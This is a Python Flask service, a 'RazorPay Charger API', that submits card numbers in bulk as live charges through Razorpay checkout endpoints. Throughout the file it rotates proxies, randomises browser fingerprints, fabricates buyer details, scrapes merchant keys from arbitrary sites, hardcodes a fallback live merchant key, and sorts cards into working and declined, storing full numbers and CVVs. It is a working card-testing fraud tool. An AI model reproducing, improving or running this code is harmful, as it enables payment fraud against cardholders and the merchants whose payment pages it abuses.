#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
RazorPay Charger API — v3 FIXED

Endpoints:
    GET /razorpay?site=&cc=&proxy=&amount=&currency=
    GET /razorpay_parallel?site=&cc=&proxy=&amount=&currency=
    GET /razorpay_batch?site=&cc=<multi-line>&proxy=&amount=&currency=&threads=
    GET /razorpay_health
"""

import re
import json
import time
import uuid
import random
import string
import sys
import os
import csv
import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FuturesTimeoutError
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import logging

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system('pip install playwright')
    os.system('playwright install chromium')
    from playwright.sync_api import sync_playwright

try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install beautifulsoup4')
    from bs4 import BeautifulSoup


app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


PARALLEL_WORKERS = 10
PARALLEL_TIMEOUT = 90

_executor = ThreadPoolExecutor(max_workers=PARALLEL_WORKERS)
_active_requests = 0
_request_lock = threading.Lock()

USD_TO_INR_RATE = 83.50
USD_TO_USDT_RATE = 1.0

CURRENCY_RATES = {
    'USD': 1.0,
    'INR': USD_TO_INR_RATE,
    'USDT': USD_TO_USDT_RATE
}

ALLOWED_CURRENCIES = ['USD', 'INR', 'USDT']
AMOUNT_MIN = 1
AMOUNT_MAX = 100

DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6..."

FALLBACK_MERCHANT = {
    'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
    'key_id': 'rzp_live_hrgl3RDoNMvCOs',
    'payment_link_id': 'pl_OzLkvRvf1drPps',
    'payment_page_item_id': 'ppi_OzLkvUeMxfhIbI'
}


class ProxyManager:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.current_index = 0
        self.lock = threading.Lock()
        self.failed_proxies = set()

    def load_from_file(self, filename="proxies.txt"):
        try:
            with open(filename, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(self.proxies)} proxies from file")
            return True
        except Exception as e:
            logger.error(f"Failed to load proxies: {e}")
            return False

    def load_from_string(self, proxy_string):
        self.proxies = [p.strip() for p in proxy_string.split(',') if p.strip()]
        logger.info(f"Loaded {len(self.proxies)} proxies from string")
        return True

    def get_next(self):
        if not self.proxies:
            return None
        with self.lock:
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.current_index % len(self.proxies)]
                self.current_index += 1
                if proxy not in self.failed_proxies:
                    return proxy
                attempts += 1
            self.failed_proxies.clear()
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            return proxy

    def mark_failed(self, proxy):
        with self.lock:
            self.failed_proxies.add(proxy)

    def get_playwright_proxy(self):
        proxy_str = self.get_next()
        if not proxy_str:
            return None

        parts = proxy_str.split(':')
        if len(parts) == 4:
            ip, port, username, password = [p.strip() for p in parts]
            return {
                "server": f"http://{ip}:{port}",
                "username": username,
                "password": password
            }
        elif len(parts) == 2:
            ip, port = [p.strip() for p in parts]
            return {"server": f"http://{ip}:{port}"}
        elif len(parts) == 3:
            ip, port, username = [p.strip() for p in parts]
            return {
                "server": f"http://{ip}:{port}",
                "username": username,
                "password": ""
            }
        return None


class FingerprintGenerator:
    @staticmethod
    def generate_muid():
        return hashlib.md5(f"{time.time()}{random.random()}{os.urandom(8)}".encode()).hexdigest()[:16]

    @staticmethod
    def generate_sid():
        return hashlib.md5(f"{random.randint(100000, 999999)}{time.time()}".encode()).hexdigest()[:16]

    @staticmethod
    def generate_guid():
        return str(uuid.uuid4())

    @staticmethod
    def get_user_agent():
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ]
        return random.choice(agents)

    @staticmethod
    def generate_fingerprint():
        return {
            'muid': FingerprintGenerator.generate_muid(),
            'sid': FingerprintGenerator.generate_sid(),
            'guid': FingerprintGenerator.generate_guid(),
            'user_agent': FingerprintGenerator.get_user_agent()
        }


def get_timestamp():
    return datetime.now().strftime("%H:%M:%S")

def get_full_timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def generate_random_user_info():
    first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emma', 'James', 'Lisa', 'Robert', 'Maria']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']

    return {
        "name": f"{random.choice(first_names)} {random.choice(last_names)}",
        "email": f"user{random.randint(100, 9999)}@gmail.com",
        "phone": f"9876543{random.randint(100, 999)}",
        "address": f"{random.randint(1, 999)} {random.choice(['Main St', 'Park Ave', 'Oak Rd', 'Maple Dr', 'Cedar Ln'])}",
        "city": random.choice(['Mumbai', 'Delhi', 'Bangalore', 'Chennai', 'Hyderabad']),
        "state": random.choice(['Maharashtra', 'Delhi', 'Karnataka', 'Tamil Nadu', 'Telangana']),
        "zip": str(random.randint(100000, 999999))
    }

def convert_currency(amount, from_currency='USD', to_currency='INR'):
    if from_currency == to_currency:
        return amount
    if from_currency == 'INR':
        usd_amount = amount / USD_TO_INR_RATE
    elif from_currency == 'USDT':
        usd_amount = amount * USD_TO_USDT_RATE
    else:
        usd_amount = amount
    if to_currency == 'INR':
        return round(usd_amount * USD_TO_INR_RATE, 2)
    elif to_currency == 'USDT':
        return round(usd_amount, 2)
    else:
        return round(usd_amount, 2)

def inr_to_paise(inr_amount):
    return int(inr_amount * 100)

def get_masked_card(card_number):
    if len(card_number) >= 10:
        return f"{card_number[:6]}******{card_number[-4:]}"
    return card_number

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip().replace(" ", ""),
        'mes': parts[1].strip().zfill(2),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        ip, port = parts
        return {"server": f"http://{ip}:{port}"}
    elif len(parts) == 4:
        ip, port, user, password = parts
        return {
            "server": f"http://{ip}:{port}",
            "username": user,
            "password": password
        }
    elif len(parts) == 3:
        ip, port, user = parts
        return {
            "server": f"http://{ip}:{port}",
            "username": user,
            "password": ""
        }
    return None

def extract_clean_response(message):
    """Extract a clean status label from razorpay responses. Never returns garbage like 'sbx_user'."""
    if message is None:
        return "UNKNOWN_ERROR"

    message = str(message).strip()
    if not message:
        return "UNKNOWN_ERROR"

    # If it's JSON, try known fields first
    try:
        data = json.loads(message)
        if isinstance(data, dict):
            if "error" in data and isinstance(data["error"], dict):
                err = data["error"]
                code = err.get("code") or err.get("reason") or err.get("description")
                if code:
                    return str(code)[:80]
            for key in ("status", "reason", "code", "description", "message"):
                if key in data and data[key]:
                    return str(data[key])[:80]
    except (ValueError, TypeError):
        pass

    # Razorpay-style error codes: UPPER_SNAKE or camelReason
    code_match = re.search(r'\b(PAYMENT_[A-Z_]+|CARD_[A-Z_]+|AUTH_[A-Z_]+|DECLINE_[A-Z_]+|BAD_REQUEST_[A-Z_]+|SERVER_[A-Z_]+|GATEWAY_[A-Z_]+)\b', message)
    if code_match:
        return code_match.group(1)

    # Common razorpay failure keywords we care about
    lowered = message.lower()
    for kw, label in (
        ("authentication failed", "AUTHENTICATION_FAILED"),
        ("card declined", "CARD_DECLINED"),
        ("insufficient", "INSUFFICIENT_FUNDS"),
        ("invalid card", "INVALID_CARD"),
        ("expired", "EXPIRED_CARD"),
        ("3ds", "3DS_REQUIRED"),
        ("captured", "PAYMENT_SUCCESS"),
        ("authorized", "PAYMENT_SUCCESS"),
        ("failed", "PAYMENT_FAILED"),
        ("timeout", "TIMEOUT"),
        ("network", "NETWORK_ERROR"),
    ):
        if kw in lowered:
            return label

    # Last resort: strip known noise tokens, return first meaningful word
    cleaned = re.sub(r'[{}"\':]+', ' ', message).strip()
    cleaned = re.sub(r'\s+', ' ', cleaned)
    # Reject short garbage tokens like 'sbx_user', 'test', 'prod', single words < 6 chars
    tokens = cleaned.split()
    for tok in tokens:
        if len(tok) >= 6 and not tok.startswith("sbx_"):
            return tok[:80]
    return cleaned[:80] if cleaned else "UNKNOWN_ERROR"

def save_results_to_file(results, filename=None):
    if not results:
        return
    if not filename:
        timestamp = get_full_timestamp()
        filename = f"razorpay_results_{timestamp}"

    json_file = f"{filename}.json"
    with open(json_file, 'w') as f:
        json.dump(results, f, indent=2)
    logger.info(f"Results saved to {json_file}")

    csv_file = f"{filename}.csv"
    with open(csv_file, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Card', 'Month', 'Year', 'CVV', 'Status', 'Amount_USD', 'Amount_INR', 'Payment_ID', 'Order_ID', 'Time', 'Timestamp'])
        for r in results:
            writer.writerow([
                r.get('card', ''), r.get('month', ''), r.get('year', ''),
                r.get('cvv', ''), r.get('status', ''), r.get('amount_usd', ''),
                r.get('amount_inr', ''), r.get('payment_id', ''), r.get('order_id', ''),
                r.get('time', ''), r.get('timestamp', '')
            ])
    logger.info(f"Results saved to {csv_file}")


_shared_playwright = None
_shared_browser = None
_browser_lock = threading.Lock()

def get_shared_browser(proxy_config=None):
    global _shared_playwright, _shared_browser
    with _browser_lock:
        if _shared_browser is None or not _shared_browser.is_connected():
            try:
                if _shared_browser:
                    _shared_browser.close()
            except Exception:
                pass
            try:
                if _shared_playwright:
                    _shared_playwright.stop()
            except Exception:
                pass
            _shared_playwright = sync_playwright().start()
            _shared_browser = _shared_playwright.chromium.launch(
                headless=True,
                proxy=proxy_config,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            )
        return _shared_browser

def close_shared_browser():
    global _shared_playwright, _shared_browser
    with _browser_lock:
        try:
            if _shared_browser:
                _shared_browser.close()
        except Exception:
            pass
        try:
            if _shared_playwright:
                _shared_playwright.stop()
        except Exception:
            pass
        _shared_browser = None
        _shared_playwright = None


def extract_merchant_from_page(page):
    """Run JS on the loaded page to extract merchant data. Returns dict or None."""
    try:
        return page.evaluate("""
            () => {
                const findInData = (d) => {
                    if (!d) return null;
                    return {
                        keyless_header: d.keyless_header || null,
                        key_id: d.key_id || null,
                        payment_link_id: d.payment_link ? d.payment_link.id : null,
                        payment_page_item_id: d.payment_link && d.payment_link.payment_page_items
                            ? d.payment_link.payment_page_items[0]?.id : null
                    };
                };

                if (window.data) {
                    const r = findInData(window.data);
                    if (r && r.keyless_header && r.key_id) return r;
                }
                if (window.__INITIAL_STATE__) {
                    const r = findInData(window.__INITIAL_STATE__);
                    if (r && r.keyless_header && r.key_id) return r;
                }

                const scripts = document.querySelectorAll('script');
                let result = { keyless_header: null, key_id: null, payment_link_id: null, payment_page_item_id: null };
                for (let s of scripts) {
                    const t = s.textContent || '';
                    if (!t) continue;
                    if (!result.keyless_header) {
                        const m = t.match(/keyless_header["']?\\s*:\\s*["']([^"']+)["']/);
                        if (m) result.keyless_header = m[1];
                    }
                    if (!result.key_id) {
                        const m = t.match(/key_id["']?\\s*:\\s*["']([^"']+)["']/);
                        if (m) result.key_id = m[1];
                    }
                    if (!result.payment_link_id) {
                        const m = t.match(/payment_link_id["']?\\s*:\\s*["']([^"']+)["']/);
                        if (m) result.payment_link_id = m[1];
                    }
                    if (!result.payment_page_item_id) {
                        const m = t.match(/payment_page_item_id["']?\\s*:\\s*["']([^"']+)["']/);
                        if (m) result.payment_page_item_id = m[1];
                    }
                }
                if (result.keyless_header && result.key_id) return result;
                return null;
            }
        """)
    except Exception as e:
        logger.warning(f"merchant JS extraction failed: {e}")
        return None


def get_session_token(page):
    """Fetch RazorPay session token. Returns token or None."""
    try:
        page.goto(
            "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1",
            timeout=60000
        )
        page.wait_for_url("**/checkout/public*session_token*", timeout=55000)
        token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
        return token
    except Exception as e:
        logger.warning(f"session token fetch failed: {e}")
        return None


def charge_razorpay_card(cc, mes, ano, cvv, site_url, amount=5, currency='USD', proxy_str=None, proxy_manager=None):
    start_time = time.time()
    result = {
        'success': False,
        'card': cc,
        'month': mes,
        'year': ano,
        'cvv': cvv,
        'masked': get_masked_card(cc),
        'amount_usd': 0,
        'amount_inr': 0,
        'currency': currency,
        'payment_id': None,
        'order_id': None,
        'status': 'unknown',
        'error': None,
        'time': 0,
        'gateway': 'RAZORPAY',
        'timestamp': get_full_timestamp(),
    }

    page = None
    try:
        card_number = cc.replace(" ", "")
        exp_month = mes.zfill(2)
        exp_year = ano
        if len(exp_year) == 2:
            exp_year = f"20{exp_year}"

        if amount == 'random':
            usd_amount = round(random.uniform(AMOUNT_MIN, AMOUNT_MAX), 2)
        else:
            try:
                usd_amount = float(amount)
            except (TypeError, ValueError):
                result['error'] = f"Invalid amount: {amount}"
                result['time'] = round(time.time() - start_time, 2)
                return result
            if usd_amount < AMOUNT_MIN or usd_amount > AMOUNT_MAX:
                result['error'] = f"Amount must be between {AMOUNT_MIN} and {AMOUNT_MAX} {currency}"
                result['time'] = round(time.time() - start_time, 2)
                return result

        result['amount_usd'] = round(usd_amount, 2)

        inr_amount = convert_currency(usd_amount, currency, 'INR')
        result['amount_inr'] = round(inr_amount, 2)
        amount_paise = inr_to_paise(inr_amount)

        proxy_config = parse_proxy(proxy_str) if proxy_str else None
        if proxy_manager and not proxy_config:
            proxy_config = proxy_manager.get_playwright_proxy()

        # 1. Merchant data — prefer dynamic extraction from the site
        merchant_data = dict(FALLBACK_MERCHANT)
        merchant_source = "fallback"

        if site_url:
            try:
                browser = get_shared_browser(proxy_config)
                probe_page = browser.new_page()
                probe_page.set_extra_http_headers({'User-Agent': FingerprintGenerator.get_user_agent()})
                try:
                    probe_page.goto(site_url, timeout=45000, wait_until='networkidle')
                    extracted = extract_merchant_from_page(probe_page)
                    if extracted and extracted.get('keyless_header') and extracted.get('key_id'):
                        # Only use extracted ids if present; otherwise keep fallback link ids
                        merchant_data['keyless_header'] = extracted['keyless_header']
                        merchant_data['key_id'] = extracted['key_id']
                        if extracted.get('payment_link_id'):
                            merchant_data['payment_link_id'] = extracted['payment_link_id']
                        if extracted.get('payment_page_item_id'):
                            merchant_data['payment_page_item_id'] = extracted['payment_page_item_id']
                        merchant_source = "dynamic"
                    else:
                        logger.warning(f"merchant extraction returned incomplete data for {site_url}")
                finally:
                    probe_page.close()
            except Exception as e:
                logger.warning(f"merchant extraction failed: {e}")

        keyless_header = merchant_data.get('keyless_header')
        key_id = merchant_data.get('key_id')
        payment_link_id = merchant_data.get('payment_link_id')
        payment_page_item_id = merchant_data.get('payment_page_item_id')

        if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
            result['error'] = f'Missing merchant data (source={merchant_source})'
            result['status'] = 'merchant_error'
            result['time'] = round(time.time() - start_time, 2)
            return result

        user_info = generate_random_user_info()
        browser = get_shared_browser(proxy_config)
        page = browser.new_page()
        page.set_extra_http_headers({'User-Agent': FingerprintGenerator.get_user_agent()})

        # 2. Session token
        session_token = get_session_token(page)
        if not session_token:
            result['error'] = 'Failed to get session token'
            result['status'] = 'session_error'
            result['time'] = round(time.time() - start_time, 2)
            return result

        # 3. Create order — surface the raw error if it fails
        order_js = """
        async ([pl_id, ppi, amt]) => {
            try {
                const r = await fetch("https://api.razorpay.com/v1/payment_pages/" + pl_id + "/order", {
                    method: "POST",
                    headers: {"Accept": "application/json", "Content-Type": "application/json"},
                    body: JSON.stringify({
                        notes: {comment: ""},
                        line_items: [{payment_page_item_id: ppi, amount: amt}]
                    })
                });
                const text = await r.text();
                let parsed;
                try { parsed = JSON.parse(text); } catch(e) { parsed = {raw: text}; }
                return { status: r.status, body: parsed };
            } catch(e) {
                return { status: 0, body: {error: String(e)} };
            }
        }
        """
        order_resp = page.evaluate(order_js, [payment_link_id, payment_page_item_id, amount_paise])
        order_body = order_resp.get("body") if isinstance(order_resp, dict) else {}
        order_id = None
        if isinstance(order_body, dict):
            if order_body.get("order") and isinstance(order_body["order"], dict):
                order_id = order_body["order"].get("id")
            elif order_body.get("id") and order_body.get("entity") == "order":
                order_id = order_body.get("id")

        if not order_id:
            err_msg = ""
            if isinstance(order_body, dict):
                if isinstance(order_body.get("error"), dict):
                    err_msg = order_body["error"].get("description") or order_body["error"].get("code") or ""
                err_msg = err_msg or order_body.get("raw") or json.dumps(order_body)
            result['error'] = f"Order creation failed: {str(err_msg)[:150]}"
            result['status'] = 'order_failed'
            result['time'] = round(time.time() - start_time, 2)
            return result

        result['order_id'] = order_id

        # 4. Submit payment
        submit_js = """
        async (args) => {
            const [k_id, sess_token, k_hdr, p_id, o_id, amt,
                   c_num, c_cvv, c_name, exp_m, exp_y, cnt, em, fp] = args;

            const params = new URLSearchParams();
            params.append("notes[comment]", "");
            params.append("payment_link_id", p_id);
            params.append("key_id", k_id);
            params.append("callback_url", "https://your-server.com/callback");
            params.append("contact", cnt);
            params.append("email", em);
            params.append("currency", "INR");
            params.append("_[library]", "checkoutjs");
            params.append("_[platform]", "browser");
            params.append("amount", String(amt));
            params.append("order_id", o_id);
            params.append("device_fingerprint[fingerprint_payload]", fp);
            params.append("method", "card");
            params.append("card[number]", c_num);
            params.append("card[cvv]", c_cvv);
            params.append("card[name]", c_name);
            params.append("card[expiry_month]", exp_m);
            params.append("card[expiry_year]", exp_y);
            params.append("save", "0");

            const qs = new URLSearchParams({
                key_id: k_id, session_token: sess_token, keyless_header: k_hdr
            });

            try {
                const r = await fetch(
                    "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?" + qs.toString(),
                    {
                        method: "POST",
                        headers: {
                            "x-session-token": sess_token,
                            "Content-Type": "application/x-www-form-urlencoded"
                        },
                        body: params.toString()
                    }
                );
                const text = await r.text();
                let parsed;
                try { parsed = JSON.parse(text); } catch(e) { parsed = text; }
                return { status: r.status, body: parsed };
            } catch(e) {
                return { status: 0, body: "NETWORK_ERROR: " + String(e) };
            }
        }
        """

        submit_result = page.evaluate(submit_js, [
            key_id, session_token, keyless_header,
            payment_link_id, order_id, amount_paise,
            card_number, cvv, user_info["name"], exp_month, exp_year,
            f"+91{user_info['phone']}", user_info["email"], DEVICE_FINGERPRINT
        ])

        data = submit_result.get("body", {}) if isinstance(submit_result, dict) else {}
        http_status = submit_result.get("status", 0) if isinstance(submit_result, dict) else 0

        payment_id = None
        if isinstance(data, dict):
            if "payment_id" in data:
                payment_id = data["payment_id"]
            elif "razorpay_payment_id" in data:
                payment_id = data["razorpay_payment_id"]
            elif "payment" in data and isinstance(data["payment"], dict):
                payment_id = data["payment"].get("id")

        if payment_id:
            result['payment_id'] = payment_id

        # 5. Parse response
        if isinstance(data, dict):
            if data.get("redirect") is True or data.get("type") == "redirect":
                redirect_url = ""
                if isinstance(data.get("request"), dict):
                    redirect_url = data["request"].get("url", "")

                if redirect_url:
                    try:
                        page.goto(redirect_url, timeout=45000, wait_until='networkidle')
                        html_content = page.content()
                        if 'razorpay_signature' in html_content:
                            result['success'] = True
                            result['status'] = 'payment_success'
                        elif payment_id:
                            status_check = page.evaluate("""
                                async ([pid, kid, st, kh]) => {
                                    try {
                                        const qs = new URLSearchParams({key_id: kid, session_token: st, keyless_header: kh});
                                        const r = await fetch("https://api.razorpay.com/v1/standard_checkout/payments/" + pid + "?" + qs.toString(), {
                                            headers: {"x-session-token": st}
                                        });
                                        if (r.ok) { const d = await r.json(); return d.status || "unknown"; }
                                        return "unknown";
                                    } catch(e) { return "unknown"; }
                                }
                            """, [payment_id, key_id, session_token, keyless_header])
                            if status_check in ('captured', 'authorized'):
                                result['success'] = True
                                result['status'] = 'payment_success'
                            elif status_check == 'pending':
                                result['success'] = True
                                result['status'] = '3ds_pending'
                            else:
                                result['status'] = '3ds_completed'
                                result['success'] = True
                        else:
                            result['success'] = True
                            result['status'] = '3ds_completed'
                    except Exception as e:
                        result['error'] = f"3DS handling error: {str(e)[:100]}"
                        result['status'] = '3ds_error'
                else:
                    result['status'] = '3ds_redirect'
                    result['success'] = True

            elif "razorpay_signature" in data or "signature" in data:
                result['success'] = True
                result['status'] = 'payment_success'

            elif "error" in data:
                err_obj = data.get("error", {})
                if isinstance(err_obj, dict):
                    desc = err_obj.get('description') or err_obj.get('reason') or err_obj.get('code') or str(data)
                    result['error'] = str(desc)[:200]
                    result['status'] = 'payment_failed'
                else:
                    result['error'] = str(err_obj)[:200]
                    result['status'] = 'payment_failed'

            elif "status" in data and data["status"] in ('captured', 'authorized'):
                result['success'] = True
                result['status'] = 'payment_success'

            else:
                result['status'] = 'unknown'
                result['error'] = json.dumps(data)[:200]
        else:
            result['error'] = f"HTTP {http_status}: {str(data)[:200]}"
            result['status'] = 'payment_failed'

        # 6. Final confirmation
        if result['success'] and payment_id:
            try:
                final_status = page.evaluate("""
                    async ([pid, kid, st, kh]) => {
                        try {
                            const qs = new URLSearchParams({key_id: kid, session_token: st, keyless_header: kh});
                            const r = await fetch("https://api.razorpay.com/v1/standard_checkout/payments/" + pid + "?" + qs.toString(), {
                                headers: {"x-session-token": st}
                            });
                            if (r.ok) { const d = await r.json(); return d.status || "unknown"; }
                            return "unknown";
                        } catch(e) { return "unknown"; }
                    }
                """, [payment_id, key_id, session_token, keyless_header])
                if final_status in ('captured', 'authorized'):
                    result['success'] = True
                    result['status'] = 'payment_success'
                elif final_status == 'failed':
                    result['success'] = False
                    result['status'] = 'payment_failed'
                    result['error'] = 'Payment failed after verification'
            except Exception:
                pass

        result['time'] = round(time.time() - start_time, 2)
        return result

    except Exception as e:
        result['error'] = str(e)[:200]
        result['status'] = 'error'
        result['time'] = round(time.time() - start_time, 2)
        if 'is_connected' in str(e).lower() or 'target' in str(e).lower():
            close_shared_browser()
        return result
    finally:
        if page is not None:
            try:
                page.close()
            except Exception:
                pass


def charge_batch(cards, site_url, amount=5, currency='USD', max_workers=5, proxy_manager=None):
    results = []
    success_count = 0
    fail_count = 0
    completed = 0
    lock = threading.Lock()

    logger.info(f"Processing {len(cards)} cards with {max_workers} threads...")

    def process_card(card):
        nonlocal completed, success_count, fail_count
        try:
            parts = parse_cc_string(card)
            result = charge_razorpay_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'],
                site_url, amount, currency, None, proxy_manager
            )
            with lock:
                completed += 1
                if result.get('success'):
                    success_count += 1
                else:
                    fail_count += 1
                results.append(result)
            return result
        except Exception as e:
            with lock:
                completed += 1
                fail_count += 1
                results.append({
                    'success': False,
                    'card': card,
                    'error': str(e),
                    'status': 'error'
                })
            return None

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(process_card, card) for card in cards]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass

    return {
        'total': len(cards),
        'success': success_count,
        'failed': fail_count,
        'results': results
    }


def build_response(result, cc_string, parallel=False):
    return {
        "Gateway": "RAZORPAY",
        "Price": result.get('amount_usd', 0),
        "Response": extract_clean_response(result.get('error') or result.get('status')),
        "Status": bool(result.get('success', False)),
        "cc": cc_string,
        "masked": get_masked_card(result.get('card', '')),
        "payment_id": result.get('payment_id'),
        "order_id": result.get('order_id'),
        "amount_inr": result.get('amount_inr', 0),
        "time": result.get('time', 0),
        "status_detail": result.get('status'),
        "error": result.get('error'),
        "parallel_mode": parallel,
    }


@app.route('/razorpay', methods=['GET'])
def razorpay_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        amount = request.args.get('amount', 5)
        currency = request.args.get('currency', 'USD')

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV", "status": False}), 400

        try:
            cc_parts = parse_cc_string(cc_string)
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        result = charge_razorpay_card(
            cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
            site, amount, currency, proxy_str
        )
        return jsonify(build_response(result, cc_string))

    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "RAZORPAY",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500


@app.route('/razorpay_parallel', methods=['GET'])
def razorpay_checker_parallel():
    global _active_requests
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        amount = request.args.get('amount', 5)
        currency = request.args.get('currency', 'USD')

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV", "status": False}), 400

        with _request_lock:
            current_active = _active_requests

        while current_active >= PARALLEL_WORKERS:
            time.sleep(0.9)
            with _request_lock:
                current_active = _active_requests

        try:
            cc_parts = parse_cc_string(cc_string)
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        with _request_lock:
            _active_requests += 1

        try:
            future = _executor.submit(
                charge_razorpay_card,
                cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
                site, amount, currency, proxy_str
            )
            result = future.result(timeout=PARALLEL_TIMEOUT)
        except FuturesTimeoutError:
            return jsonify({
                "error": "Request timeout",
                "status": False,
                "Gateway": "RAZORPAY",
                "Price": 0.0,
                "Response": "TIMEOUT",
                "cc": cc_string
            }), 504
        except Exception as e:
            return jsonify({
                "error": str(e),
                "status": False,
                "Gateway": "RAZORPAY",
                "Price": 0.0,
                "Response": f"ERROR: {str(e)}",
                "cc": cc_string
            }), 500
        finally:
            with _request_lock:
                _active_requests -= 1

        resp = build_response(result, cc_string, parallel=True)
        resp["active_requests"] = _active_requests
        return jsonify(resp)

    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "RAZORPAY",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500


@app.route('/razorpay_batch', methods=['GET', 'POST'])
def razorpay_checker_batch():
    try:
        src = request.args if request.method == 'GET' else request.form
        site = (src.get('site') or '').strip()
        cc_block = (src.get('cc') or '').strip()
        proxy_str = (src.get('proxy') or '').strip()
        amount = src.get('amount', 5)
        currency = src.get('currency', 'USD')
        try:
            threads = int(src.get('threads', 5))
        except (TypeError, ValueError):
            threads = 5
        threads = max(1, min(threads, 50))

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_block:
            return jsonify({"error": "Missing 'cc' parameter", "status": False}), 400

        cards = [line.strip() for line in cc_block.splitlines() if line.strip() and not line.strip().startswith('#')]
        if not cards:
            return jsonify({"error": "No valid cards found", "status": False}), 400

        pm = None
        if proxy_str:
            pm = ProxyManager()
            pm.load_from_string(proxy_str)

        started = time.time()
        batch = charge_batch(cards, site, amount, currency, max_workers=threads, proxy_manager=pm)

        response_data = {
            "Gateway": "RAZORPAY",
            "total": batch['total'],
            "success_count": batch['success'],
            "failed_count": batch['failed'],
            "elapsed": round(time.time() - started, 2),
            "results": [
                {
                    "cc": r.get('card', ''),
                    "masked": r.get('masked', ''),
                    "Response": extract_clean_response(r.get('error') or r.get('status')),
                    "Status": bool(r.get('success', False)),
                    "status_detail": r.get('status'),
                    "error": r.get('error'),
                    "amount_usd": r.get('amount_usd', 0),
                    "amount_inr": r.get('amount_inr', 0),
                    "payment_id": r.get('payment_id'),
                    "order_id": r.get('order_id'),
                    "time": r.get('time', 0),
                }
                for r in batch['results']
            ],
        }
        return jsonify(response_data)

    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500


@app.route('/razorpay_health', methods=['GET'])
def razorpay_health():
    return jsonify({
        "status": "online",
        "timestamp": get_full_timestamp(),
        "version": "3.0",
        "browser_status": "connected" if _shared_browser and _shared_browser.is_connected() else "disconnected"
    })


if __name__ == "__main__":
    import atexit
    atexit.register(close_shared_browser)

    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
